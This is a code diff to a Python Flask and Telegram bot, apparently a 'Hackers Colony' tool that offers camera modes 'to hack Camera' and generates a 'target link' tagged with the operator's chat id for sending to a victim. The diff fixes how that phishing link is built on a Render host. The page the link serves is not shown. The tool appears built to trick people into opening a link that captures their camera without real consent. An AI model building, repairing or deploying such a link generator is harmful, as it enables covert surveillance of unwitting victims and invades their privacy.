@@ -4,11 +4,11 @@ from telebot import types
 
 app = Flask(__name__)
 
-# Configuration
+# Configuration from Environment Variables
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMINS = [518067190, 7162565886]
 TG_CHANNEL = "https://t.me/HackersColony"
-YT_LINK = "https://youtube.com/@hackers_colony_tech?si=W2r1_Su7wPvnfy2u" # Your Link Updated
+YT_LINK = "https://youtube.com/@hackers_colony_tech?si=W2r1_Su7wPvnfy2u"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -21,6 +21,7 @@ def db_init():
 
 db_init()
 
+# Clear previous sessions to avoid 409 error
 bot.remove_webhook()
 time.sleep(2)
 
@@ -64,20 +65,24 @@ def callback_query(call):
         markup.row(btn1, btn2)
         markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
         markup.row(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
-        bot.edit_message_text("<b>Select your camera mode:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
+        bot.edit_message_text("<b>🤠 Select your camera mode to hack Camera 📸:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
 
     elif "m_" in call.data:
         mode = call.data.replace("m_", "")
-        # Robust link generation for Render
-        app_url = request.host_url.rstrip('/')
-        target_link = f"{app_url}/?m={mode}&uid={call.message.chat.id}"
-        
-        response_text = (
-            f"🤠 It's your target link 🔗\n\n"
-            f"Url = ( {target_link} )\n\n"
-            f"✨ Thank you team HCO ✨"
-        )
-        bot.send_message(call.message.chat.id, response_text, parse_mode='HTML', disable_web_page_preview=True)
+        # This part generates the blue clickable link
+        try:
+            # Fixing the URL logic specifically for Render
+            app_domain = request.host.rstrip('/')
+            target_link = f"https://{app_domain}/?m={mode}&uid={call.message.chat.id}"
+            
+            response_text = (
+                f"🤠 It's your target link 🔗\n\n"
+                f"Url = ( {target_link} )\n\n"
+                f"✨ Thank you team HCO ✨"
+            )
+            bot.send_message(call.message.chat.id, response_text, parse_mode='HTML', disable_web_page_preview=True)
+        except Exception as e:
+            bot.send_message(call.message.chat.id, f"Error: {str(e)}")
 
 @app.route('/')
 def index():
